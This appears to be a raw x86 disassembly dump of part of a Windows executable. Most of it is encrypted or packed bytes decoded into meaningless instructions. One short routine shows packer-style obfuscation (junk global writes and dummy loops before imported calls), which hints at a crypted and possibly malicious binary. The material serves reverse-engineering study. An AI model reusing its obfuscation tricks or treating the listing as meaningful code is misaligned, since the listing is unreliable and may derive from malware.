  40d30d:	xchg   esi,eax
  40d30e:	sahf   
  40d30f:	xor    al,0x41
  40d311:	out    0xd1,al
  40d313:	out    dx,al
  40d314:	into   
  40d315:	mov    ah,0x3a
  40d317:	mov    eax,ds:0x82f23b46
  40d31c:	or     al,BYTE PTR [ebx+0x508d3a07]
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	push   ss
  40d339:	popa   
  40d33a:	int    0x76
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	fisttp QWORD PTR [edi]
  40d346:	xor    al,0xbc
  40d348:	int    0x28
  40d34a:	imul   ecx,DWORD PTR [esi-0x791fc3e5],0xaff8d80b
  40d354:	mov    al,ds:0x92d60e19
  40d359:	dec    esp
  40d35a:	shl    ah,0xb4
  40d35d:	sbb    eax,0xbd3d8bd0
  40d362:	mov    ch,0x65
  40d364:	test   al,0x22
  40d366:	inc    ebp
  40d367:	imul   edi,ebp,0xb467449b
  40d36d:	fisttp DWORD PTR [esi-0x62]
  40d370:	add    BYTE PTR [eax],bh
  40d372:	jns    0x40d317
  40d374:	lods   al,BYTE PTR ds:[esi]
  40d375:	pusha  
  40d376:	jecxz  0x40d377
  40d378:	int    0x97
  40d37a:	add    ebx,DWORD PTR [esi+0x7a]
  40d37d:	jmp    0x40d3fb
  40d37f:	inc    edi
  40d380:	jno    0x40d381
  40d382:	sti    
  40d383:	xchg   ebx,eax
  40d384:	out    0xd3,eax
  40d386:	test   BYTE PTR [ebp-0x2af35710],0xd
  40d38d:	into   
  40d38e:	stc    
  40d38f:	loope  0x40d31b
  40d391:	mov    dl,bl
  40d393:	(bad)  
  40d394:	xchg   edi,eax
  40d395:	ret    
  40d396:	ins    DWORD PTR es:[edi],dx
  40d397:	cs scas eax,DWORD PTR es:[edi]
  40d399:	cdq    
  40d39a:	dec    eax
  40d39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d39c:	xor    edi,DWORD PTR [esi-0x7501288d]
  40d3a2:	das    
  40d3a3:	stos   BYTE PTR es:[edi],al
  40d3a4:	and    DWORD PTR [ecx-0x31],edi
  40d3a7:	and    eax,0xce3ebb1e
  40d3ac:	mov    eax,0x6c6ecc01
  40d3b1:	dec    ebp
  40d3b2:	pop    ds
  40d3b3:	jno    0x40d3a3
  40d3b5:	pop    edx
  40d3b6:	adc    al,0xd6
  40d3b8:	daa    
  40d3b9:	push   esi
  40d3ba:	adc    al,0x16
  40d3bc:	mov    ds:0x9058465,al
  40d3c1:	and    edx,DWORD PTR [ecx-0x78]
  40d3c4:	dec    BYTE PTR [esi]
  40d3c6:	sbb    esp,DWORD PTR [ebx+0x414665af]
  40d3cc:	iret   
  40d3cd:	sub    DWORD PTR [esi+0x7],0x29c005bc
  40d3d4:	retf   0x7e80
  40d3d7:	add    esp,DWORD PTR [ebx+0x37]
  40d3da:	ds and eax,0x686f836b
  40d3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e1:	ud1    esi,DWORD PTR [edx-0x34a179b6]
  40d3e8:	pop    esi
  40d3e9:	dec    esi
  40d3ea:	xor    ch,dl
  40d3ec:	xchg   edi,eax
  40d3ed:	jnp    0x40d401
  40d3ef:	mov    dh,0x7e
  40d3f1:	cmp    eax,esp
  40d3f3:	sbb    BYTE PTR [eax],0x2c
  40d3f6:	scas   eax,DWORD PTR es:[edi]
  40d3f7:	mov    al,ds:0xeeb5e53a
  40d3fc:	cwde   
  40d3fd:	add    eax,0x4eba9289
  40d402:	aaa    
  40d403:	cmp    esi,esi
  40d405:	repnz imul ecx,DWORD PTR [ebx],0x530cf20f
  40d40c:	jmp    0x40d3e6
  40d40e:	jle    0x2644450f
  40d414:	mov    cl,0x88
  40d416:	arpl   WORD PTR [ebx-0x64],dx
  40d419:	sahf   
  40d41a:	fisttp DWORD PTR [ebx+0x71]
  40d41d:	(bad)  
  40d41e:	xchg   edx,eax
  40d41f:	das    
  40d420:	dec    edx
  40d421:	lods   eax,DWORD PTR ds:[esi]
  40d422:	(bad)  
  40d424:	(bad)  
  40d425:	out    0x4e,eax
  40d427:	repnz imul DWORD PTR [eax+0x33]
  40d42b:	pop    esi
  40d42c:	adc    DWORD PTR [edx+ebx*2],edi
  40d42f:	imul   esi,ebx,0x539f0441
  40d435:	in     al,dx
  40d436:	and    eax,0xd256c5e3
  40d43b:	or     DWORD PTR [ebx+eax*8-0x63457103],esp
  40d442:	jmp    0xe8f1f601
  40d447:	and    BYTE PTR [eax+0x5b],bh
  40d44a:	lahf   
  40d44b:	stos   BYTE PTR es:[edi],al
  40d44c:	daa    
  40d44d:	lahf   
  40d44e:	mov    BYTE PTR [eax+0x1adcb4dc],ah
  40d454:	sbb    DWORD PTR [ebp+0x20],esi
  40d457:	mov    ebx,0xef2e911c
  40d45c:	(bad)  
  40d45d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d45e:	adc    bh,0x3b
  40d461:	or     dh,0x17
  40d464:	cmp    esi,DWORD PTR [eax]
  40d466:	stos   BYTE PTR es:[edi],al
  40d467:	mov    esi,0x525b11e7
  40d46c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d46d:	(bad)  
  40d46e:	cs pop edx
  40d470:	dec    ebx
  40d471:	pop    edi
  40d472:	push   edi
  40d473:	xchg   esp,eax
  40d474:	loop   0x40d3fd
  40d476:	pop    esp
  40d477:	mov    ss,WORD PTR ds:0xaf6d35d4
  40d47d:	fnsave [esi-0x32d539e5]
  40d483:	fisttp QWORD PTR [ebx-0x7433eda9]
  40d489:	jg     0x40d4c5
  40d48b:	fwait
  40d48c:	rcl    BYTE PTR [ebx-0x6d],0xa4
  40d490:	popa   
  40d491:	jmp    0xfb647001
  40d496:	dec    esi
  40d497:	out    0xe0,al
  40d499:	pop    edi
  40d49a:	ss jb  0x40d471
  40d49d:	push   esp
  40d49e:	mov    dh,BYTE PTR [ebp-0x2a96ea2f]
  40d4a4:	or     BYTE PTR [esi+0xe],0xe0
  40d4a8:	(bad)  
  40d4a9:	fprem1 
  40d4ab:	fwait
  40d4ac:	test   al,0xa6
  40d4ae:	inc    edi
  40d4af:	pop    ebx
  40d4b0:	mov    ecx,0x8486cdd
  40d4b5:	sub    edx,edx
  40d4b7:	push   0xc448333a
  40d4bc:	adc    ch,bh
  40d4be:	and    DWORD PTR [edi+0x618e873b],ecx
  40d4c4:	xchg   edi,eax
  40d4c5:	cmp    eax,0xe2ebb131
  40d4ca:	nop
  40d4cb:	push   edx
  40d4cc:	repz (bad) 
  40d4cf:	outs   dx,BYTE PTR ds:[esi]
  40d4d0:	add    ecx,0x36e4a449
  40d4d6:	push   edi
  40d4d7:	call   0x8053:0x1b86780f
  40d4de:	inc    ebx
  40d4df:	push   ebx
  40d4e0:	inc    edx
  40d4e1:	mov    eax,ds:0xda6eb43a
  40d4e6:	stos   BYTE PTR es:[edi],al
  40d4e7:	adc    dl,BYTE PTR [esi+0x9]
  40d4ea:	and    esi,DWORD PTR ds:0x227eaa73
  40d4f0:	scas   eax,DWORD PTR es:[edi]
  40d4f1:	mov    dh,0x59
  40d4f3:	mov    edx,0x30e4479
  40d4f8:	jo     0x40d4a8
  40d4fa:	push   cs
  40d4fb:	popa   
  40d4fc:	fsubr  DWORD PTR [esp+eax*8-0x47]
  40d500:	outs   dx,BYTE PTR ds:[esi]
  40d501:	xchg   esi,eax
  40d502:	mov    esp,0xaabd4878
  40d507:	mov    ecx,0x1294e01f
  40d50c:	and    al,0xfb
  40d50e:	cmp    al,0xc0
  40d510:	dec    edi
  40d511:	test   DWORD PTR [ebx],edi
  40d513:	ret    0x8e50
  40d516:	loope  0x40d4a6
  40d518:	mov    bl,0x51
  40d51a:	sub    ecx,DWORD PTR [eax]
  40d51c:	xchg   DWORD PTR [ebp+0x5],ebp
  40d51f:	popf   
  40d520:	pop    edx
  40d521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d522:	imul   ebp,ebx,0x80ececdb
  40d528:	lds    edx,FWORD PTR [ecx+0x8]
  40d52b:	xchg   ebp,eax
  40d52c:	jmp    0x40d4db
  40d52e:	rcr    BYTE PTR [eax],cl
  40d530:	dec    ebp
  40d531:	xchg   edi,eax
  40d532:	pop    edx
  40d533:	and    al,0x1a
  40d535:	pop    es
  40d536:	mov    esi,0xbc720bee
  40d53b:	out    0x0,eax
  40d53d:	adc    al,0xc9
  40d53f:	jne    0x40d586
  40d541:	lods   al,BYTE PTR ds:[esi]
  40d542:	xchg   edx,eax
  40d543:	aaa    
  40d544:	xchg   esp,eax
  40d545:	jl     0x40d526
  40d547:	xchg   esi,eax
  40d548:	pop    ds
  40d549:	sub    al,0xca
  40d54b:	jl     0x40d4cf
  40d54d:	sub    eax,0xa04bb017
  40d552:	xchg   ebx,eax
  40d553:	ss inc ebx
  40d555:	xchg   ebx,eax
  40d556:	cmp    DWORD PTR [edx-0x6d],edi
  40d559:	(bad)  
  40d55a:	ficomp DWORD PTR [esi+0x41]
  40d55d:	test   eax,0xf44257ab
  40d562:	xchg   esi,eax
  40d563:	sbb    eax,0xd3ceb617
  40d568:	dec    esp
  40d569:	icebp  
  40d56a:	mov    ebp,0x739421f8
  40d56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d570:	mov    gs,ecx
  40d572:	mov    bl,0xae
  40d574:	dec    eax
  40d575:	or     DWORD PTR [ecx+0x1d3a7922],esp
  40d57b:	data16 fsubr DWORD PTR [eax-0x4604e526]
  40d582:	mov    cl,0xb3
  40d584:	and    BYTE PTR [eax+ecx*2+0x43c9ad5a],al
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x22a0482a
  40d6f9:	fild   WORD PTR [edi-0xe]
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d773
  40d705:	pop    ds
  40d706:	gs sbb al,cl
  40d709:	or     eax,0xdd5f444a
  40d70e:	and    ch,bh
  40d710:	jl     0x40d6f8
  40d712:	pop    edi
  40d713:	mov    ah,0x7f
  40d715:	outs   dx,DWORD PTR ds:[esi]
  40d716:	jb     0x40d6c6
  40d718:	mov    al,ds:0x799ee291
  40d71d:	lods   al,BYTE PTR ds:[esi]
  40d71e:	add    BYTE PTR [esi+ecx*8-0x6ef45167],ch
  40d725:	stos   BYTE PTR es:[edi],al
  40d726:	adc    cl,BYTE PTR [ebx]
  40d728:	lea    eax,[edx-0x10d01a99]
  40d72e:	retf   0x110
  40d731:	jmp    0x40d751
  40d733:	xor    dl,0x9d
  40d736:	jecxz  0x40d780
  40d738:	call   0xc95553ae
  40d73d:	shl    BYTE PTR [esi-0x3b767548],0xcb
  40d744:	pop    es
  40d745:	lods   al,BYTE PTR ds:[esi]
  40d746:	lods   eax,DWORD PTR ds:[esi]
  40d747:	cld    
  40d748:	pop    ebx
  40d749:	pop    ebx
  40d74a:	dec    esi
  40d74b:	mov    WORD PTR [edi],ss
  40d74d:	lods   eax,DWORD PTR ds:[esi]
  40d74f:	adc    DWORD PTR [edi+0x67731ec],edx
  40d755:	mov    dh,0xc8
  40d757:	nop
  40d758:	arpl   WORD PTR [edi-0x2e],sp
  40d75b:	addr16 (bad) 
  40d75d:	rcl    cl,0x68
  40d760:	add    BYTE PTR [edi-0x159da1e],ah
  40d766:	mov    eax,0x468def50
  40d76b:	add    ebp,esi
  40d76d:	inc    eax
  40d76e:	cmp    BYTE PTR [eax],0x48
  40d771:	push   ecx
  40d772:	xchg   edx,eax
  40d773:	and    dl,BYTE PTR [ebx]
  40d775:	push   ss
  40d776:	push   edi
  40d777:	add    DWORD PTR [edi+eax*4-0x5d3b0eb0],0x3f
  40d77f:	sub    edx,DWORD PTR [ecx+0x7d]
  40d782:	out    0x5,al
  40d784:	bound  esp,QWORD PTR [edx]
  40d786:	sysenter 
  40d788:	cmp    BYTE PTR [esp+ebx*4-0xf],al
  40d78c:	and    eax,0x55a5ab17
  40d791:	adc    edi,DWORD PTR [esi+0x18b1c70a]
  40d797:	mov    ds:0xc348f9b8,al
  40d79c:	icebp  
  40d79d:	push   edi
  40d79e:	fadd   QWORD PTR [edx]
  40d7a0:	iret   
  40d7a1:	int    0x5a
  40d7a3:	pop    edx
  40d7a4:	loopne 0x40d791
  40d7a6:	or     eax,DWORD PTR [edi+0x75]
  40d7a9:	mov    ebx,ebp
  40d7ab:	xchg   ecx,eax
  40d7ac:	mov    es,WORD PTR [ecx-0x4699dbb6]
  40d7b2:	lahf   
  40d7b3:	ror    DWORD PTR [ebx],1
  40d7b5:	loop   0x40d80f
  40d7b7:	mov    edi,0x3b840d5e
  40d7bc:	jecxz  0x40d7a9
  40d7be:	mov    ch,0xff
  40d7c0:	mov    al,ah
  40d7c2:	inc    edx
  40d7c3:	popf   
  40d7c4:	iret   
  40d7c5:	outs   dx,DWORD PTR ds:[esi]
  40d7c6:	jnp    0x40d7b6
  40d7c8:	mov    bh,0xeb
  40d7ca:	xor    ebx,edi
  40d7cc:	fldenv [esi+eax*1-0x3d4041ef]
  40d7d3:	sub    DWORD PTR [edx+0x4dc29fa6],esi
  40d7d9:	jmp    0x7bc:0x646bb50b
  40d7e0:	inc    edx
  40d7e1:	test   DWORD PTR [ebp+eax*4-0x19],0x9fc6892
  40d7e9:	stos   DWORD PTR es:[edi],eax
  40d7ea:	call   0x60dc:0x593f8e80
  40d7f1:	lods   eax,DWORD PTR ds:[esi]
  40d7f2:	in     eax,dx
  40d7f3:	push   esp
  40d7f4:	pop    esi
  40d7f5:	leave  
  40d7f6:	aad    0x61
  40d7f8:	or     ebp,ebp
  40d7fa:	jle    0x40d802
  40d7fc:	gs jp  0x40d794
  40d7ff:	jno    0x40d791
  40d801:	js     0x40d84b
  40d803:	mov    eax,0xa16cd717
  40d808:	dec    esp
  40d809:	add    ebx,ebx
  40d80b:	cmp    dh,dh
  40d80d:	sub    DWORD PTR [ecx-0xa444f70],esp
  40d813:	mov    ebp,0xd6cf7084
  40d818:	in     eax,dx
  40d819:	push   ss
  40d81a:	(bad)  
  40d81c:	(bad)  
  40d81d:	ret    0xe226
  40d820:	add    DWORD PTR [edi-0x77],esp
  40d823:	out    0x48,al
  40d825:	mov    ecx,0xb968ce58
  40d82a:	ret    
  40d82b:	inc    edx
  40d82c:	xchg   ecx,eax
  40d82d:	and    eax,0xe1f1d113
  40d832:	out    0x3a,al
  40d834:	pusha  
  40d835:	int    0x3f
  40d837:	es jae 0x40d80d
  40d83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d83b:	out    dx,eax
  40d83c:	or     eax,0xe6b05716
  40d841:	sub    ecx,DWORD PTR [esi+0x46a0f04a]
  40d847:	dec    esi
  40d848:	nop
  40d849:	mov    al,ds:0x92667cb1
  40d84e:	dec    esi
  40d84f:	xchg   esi,eax
  40d850:	std    
  40d851:	push   ds
  40d852:	adc    al,0xa9
  40d854:	sbb    al,0x33
  40d856:	ins    BYTE PTR es:[edi],dx
  40d857:	or     bl,bh
  40d859:	add    bl,cl
  40d85b:	(bad)
  40d85e:	jno    0x40d7fa
  40d860:	cmc    
  40d861:	mov    ebp,0x1d5b84af
  40d866:	cmp    ebp,ebx
  40d868:	add    al,0x7f
  40d86a:	dec    esi
  40d86b:	imul   ecx,esi,0xa22ce2f2
  40d871:	loop   0x40d877
  40d873:	push   0x70
  40d875:	lods   al,BYTE PTR ds:[esi]
  40d876:	mov    WORD PTR ds:0x7d5d2ebd,ds
  40d87c:	fldenv [eax+0x50]
  40d87f:	cmp    ebx,DWORD PTR [esi-0x41cb7346]
  40d885:	xor    DWORD PTR [eax+eax*1],esi
  40d888:	sbb    eax,0x6fe81fda
  40d88d:	inc    ebp
  40d88e:	and    BYTE PTR [eax-0x513ac997],ah
  40d894:	fist   WORD PTR [eax-0x5816f403]
  40d89b:	dec    esi
  40d89c:	mov    edi,0xed1094a6
  40d8a1:	xchg   ebp,eax
  40d8a2:	fs pusha 
  40d8a4:	mov    al,al
  40d8a6:	mov    esp,0xe0613909
  40d8ab:	mov    ecx,0xd4ff4be8
  40d8b0:	mov    ds:0xe2761a16,eax
  40d8b5:	stos   DWORD PTR es:[edi],eax
  40d8b6:	pop    ecx
  40d8b7:	aas    
  40d8b8:	mov    edx,0x660cd7a8
  40d8bd:	(bad)
  40d8c0:	mov    ch,0x82
  40d8c2:	mov    esp,0xbfa36081
  40d8c7:	into   
  40d8c8:	xlat   BYTE PTR ds:[ebx]
  40d8c9:	sbb    al,0xea
  40d8cb:	jne    0x40d8b0
  40d8cd:	cmp    BYTE PTR [esi+0x5401085c],0x4c
  40d8d4:	ss call 0xb273:0x205b4ba3
  40d8dc:	xchg   ebp,eax
  40d8dd:	(bad)  
  40d8de:	(bad)  
  40d8df:	in     al,dx
  40d8e0:	or     dl,BYTE PTR [eax+eiz*2+0x48821a07]
  40d8e7:	push   esi
  40d8e8:	in     al,0xba
  40d8ea:	cmp    bh,bh
  40d8ec:	fs inc edi
  40d8ee:	or     BYTE PTR [ecx+0x58],bl
  40d8f1:	mov    al,ds:0xdfcfd3b9
  40d8f6:	rcr    bl,1
  40d8f8:	stos   BYTE PTR es:[edi],al
  40d8f9:	adc    DWORD PTR [ebx-0x5269f9c1],ebx
  40d8ff:	sub    eax,0xa1af5e1
  40d904:	jo     0x40d927
  40d906:	mov    al,al
  40d908:	pop    edx
  40d909:	and    BYTE PTR [ebx+0x56c6264f],0x52
  40d910:	add    bl,0xfc
  40d913:	add    dh,BYTE PTR [edi-0x4bf4452a]
  40d919:	icebp  
  40d91a:	pop    ebp
  40d91b:	jae    0x40d8b2
  40d91d:	cs and al,0xa7
  40d920:	xor    BYTE PTR [eax-0x5b],dh
  40d923:	or     cl,BYTE PTR [esi+0x6766491]
  40d929:	fsubr  QWORD PTR [ebp-0x73]
  40d92c:	pop    ss
  40d92d:	gs push edx
  40d92f:	cmc    
  40d930:	ret    0x2beb
  40d933:	stc    
  40d934:	xchg   edi,eax
  40d935:	mov    ds:0x67039210,al
  40d93a:	jp     0x40d906
  40d93c:	retf   0x9df6
  40d93f:	or     DWORD PTR [edx-0x7653d407],eax
  40d945:	add    DWORD PTR [ebx-0xd1607bb],ecx
  40d94b:	add    al,0x0
  40d94d:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40d953:	adc    BYTE PTR [ebx],dh
  40d955:	mov    DWORD PTR [ebx],0x258e9c6
  40d95b:	add    BYTE PTR [eax],al
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xba2b51ed
  40d96a:	popa   
  40d96b:	jp     0x40d99c
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	or     BYTE PTR [ecx-0x4],ah
  40d978:	test   al,0x1c
  40d97a:	sbb    eax,0x68704d7b
  40d97f:	mov    ch,0x54
  40d981:	(bad)  
  40d982:	cmp    BYTE PTR [ebx-0x1409045c],cl
  40d988:	mov    ?,WORD PTR [eax]
  40d98a:	jmp    FWORD PTR [ecx-0x6b]
  40d98d:	dec    ecx
  40d98e:	(bad)  
  40d98f:	fild   QWORD PTR [edi]
  40d991:	mov    dl,0x81
  40d993:	nop
  40d994:	cld    
  40d995:	ja     0x40d979
  40d997:	xchg   DWORD PTR [ecx+edx*4-0x11],edi
  40d99b:	sbb    BYTE PTR [eax],cl
  40d99d:	and    DWORD PTR [esi-0x19],ebp
  40d9a0:	sub    BYTE PTR [ecx+0x1f],ah
  40d9a3:	mov    ds:0x31c26dc7,eax
  40d9a8:	popf   
  40d9a9:	enter  0x6ae7,0xbd
  40d9ad:	mov    bl,0x3a
  40d9af:	(bad)  
  40d9b0:	and    ch,BYTE PTR [esi+0x3f140d1f]
  40d9b6:	push   ebx
  40d9b7:	add    BYTE PTR [edi],dl
  40d9b9:	sub    BYTE PTR [ebp-0x35c1d70a],al
  40d9bf:	daa    
  40d9c0:	xlat   BYTE PTR ds:[ebx]
  40d9c1:	repnz push 0x55f42a8b
  40d9c7:	mov    esi,0xcc85a36e
  40d9cc:	in     al,0x8f
  40d9ce:	fwait
  40d9cf:	or     bl,BYTE PTR ss:[ecx+eiz*1]
  40d9d3:	sbb    DWORD PTR [edx],esi
  40d9d5:	leave  
  40d9d6:	pop    eax
  40d9d7:	mov    cl,0xa3
  40d9d9:	into   
  40d9da:	sbb    DWORD PTR [ecx-0x69a83029],ebx
  40d9e0:	and    eax,0xadbd1c13
  40d9e5:	sub    eax,0x6df57508
  40d9ea:	lods   al,BYTE PTR fs:[esi]
  40d9ec:	shl    ecx,0x10
  40d9ef:	mov    ecx,0x17625143
  40d9f4:	mov    BYTE PTR [edi-0x6e],bl
  40d9f7:	inc    ebp
  40d9f8:	mov    BYTE PTR [eax],dh
  40d9fa:	mov    dl,0x48
  40d9fc:	fldenv cs:[edi+0x1222641e]
  40da03:	push   eax
  40da04:	out    dx,al
  40da05:	inc    ebx
  40da06:	pop    ebx
  40da07:	sbb    esp,eax
  40da09:	neg    ch
  40da0b:	scas   eax,DWORD PTR es:[edi]
  40da0c:	add    ebx,DWORD PTR [edi-0x3d249835]
  40da12:	stc    
  40da13:	adc    bh,cl
  40da15:	daa    
  40da16:	jmp    0x20144e5d
  40da1b:	mov    bh,0xf6
  40da1d:	outs   dx,DWORD PTR ds:[esi]
  40da1e:	scas   al,BYTE PTR es:[di]
  40da20:	test   al,0x61
  40da22:	int    0xe1
  40da24:	pop    ebx
  40da25:	gs rol bl,1
  40da28:	in     eax,0x49
  40da2a:	adc    eax,ecx
  40da2c:	sub    al,0xce
  40da2e:	jae    0x40daaf
  40da30:	out    0x9,eax
  40da32:	pop    edi
  40da33:	mov    ecx,0x8d9350f3
  40da38:	div    ebx
  40da3a:	pop    ebx
  40da3b:	outs   dx,DWORD PTR ds:[esi]
  40da3c:	mov    dl,0x5d
  40da3e:	dec    eax
  40da3f:	ins    BYTE PTR es:[edi],dx
  40da40:	jb     0x40da66
  40da42:	ins    BYTE PTR es:[edi],dx
  40da43:	inc    edi
  40da44:	jo     0x40da0e
  40da46:	fiadd  DWORD PTR [eax-0x1372fe6f]
  40da4c:	shl    dh,0x75
  40da4f:	test   al,0x15
  40da51:	arpl   ax,bp
  40da53:	inc    edx
  40da54:	mov    ah,0x3e
  40da56:	bound  esi,QWORD PTR [esi+0x5e820563]
  40da5c:	sub    al,BYTE PTR [ebx]
  40da5e:	inc    esi
  40da5f:	sub    BYTE PTR [ecx+eax*8-0x1b],cl
  40da63:	mov    ds:0xa4bd1fd1,al
  40da68:	sti    
  40da69:	push   edx
  40da6a:	int    0x34
  40da6c:	and    ebp,esi
  40da6e:	sub    esp,eax
  40da70:	mov    al,ds:0xe34d7b41
  40da76:	jl     0x40da8d
  40da78:	sub    DWORD PTR [edx+0x5cfc7e46],0xb4f6d7bb
  40da82:	jbe    0x40daf6
  40da84:	aaa    
  40da85:	push   cs
  40da86:	int3   
  40da87:	add    BYTE PTR [eax-0x5e],al
  40da8a:	outs   dx,DWORD PTR ds:[esi]
  40da8b:	pushf  
  40da8c:	sbb    DWORD PTR [esi],ecx
  40da8e:	mov    ds:0x4ba3bd4b,eax
  40da93:	loope  0x40da92
  40da95:	loopne 0x40da82
  40da97:	push   esi
  40da98:	test   eax,0x235fb9a4
  40da9d:	pusha  
  40da9e:	int    0xb
  40daa0:	and    cl,ah
  40daa2:	xor    eax,DWORD PTR [ebp+0x44cdcc28]
  40daa8:	mov    ch,0xec
  40daaa:	idiv   DWORD PTR [esi-0x6e]
  40daad:	test   eax,0x4b0357d4
  40dab2:	mov    esi,ebx
  40dab4:	pop    esi
  40dab5:	sti    
  40dab6:	jae    0x40da70
  40dab8:	pusha  
  40dab9:	mov    bh,0x3d
  40dabb:	int    0x69
  40dabd:	mov    eax,0x980ca08e
  40dac2:	es jnp 0x40db3a
  40dac5:	stos   BYTE PTR es:[edi],al
  40dac6:	stc    
  40dac7:	sbb    DWORD PTR ds:[eax+edi*4-0x3d1c8669],edi
  40dacf:	(bad)  
  40dad0:	out    dx,al
  40dad1:	jge    0x40dae1
  40dad3:	call   0xfb00:0x9fd0eee1
  40dada:	inc    ecx
  40dadb:	push   cs
  40dadc:	mov    ds:0x97dcaf9d,al
  40dae1:	pop    ebp
  40dae2:	xchg   ecx,eax
  40dae3:	ins    DWORD PTR es:[edi],dx
  40dae4:	mul    DWORD PTR [eax+0x1d]
  40dae7:	stos   DWORD PTR es:[edi],eax
  40dae8:	xor    al,bl
  40daea:	int3   
  40daeb:	sub    al,0x70
  40daed:	test   eax,0xe1a10225
  40daf2:	fiadd  DWORD PTR [edi]
  40daf4:	ficomp WORD PTR [edx-0x1]
  40daf7:	mov    al,ds:0x5c8a6f0b
  40dafc:	enter  0xdaaf,0xe1
  40db00:	or     eax,0x57af8f51
  40db05:	and    DWORD PTR [esp+ebp*8+0x33],0xffffffa5
  40db0a:	push   0x10332dff
  40db0f:	cmp    DWORD PTR [edi],edx
  40db11:	and    esi,DWORD PTR gs:[edi-0x30]
  40db15:	add    al,0xf0
  40db17:	push   ebx
  40db18:	xor    eax,0x950ad607
  40db1d:	jnp    0x40db27
  40db1f:	pop    ss
  40db20:	scas   eax,DWORD PTR es:[edi]
  40db21:	pop    edi
  40db22:	sub    eax,0xcde5791e
  40db27:	test   BYTE PTR [ebx+eiz*1+0x4768770b],0x6c
  40db2f:	nop
  40db30:	gs xor al,0x20
  40db33:	std    
  40db34:	sbb    esp,DWORD PTR [ebp+0x2b07ad5f]
  40db3a:	inc    edi
  40db3b:	ss push ebx
  40db3d:	adc    dh,BYTE PTR [edx+0x5c093cd3]
  40db43:	cwde   
  40db44:	cmp    BYTE PTR [ebx-0x1afbd490],0xc7
  40db4b:	aad    0xe7
  40db4d:	jecxz  0x40dbc0
  40db4f:	jbe    0x40dbbb
  40db51:	jle    0x40db02
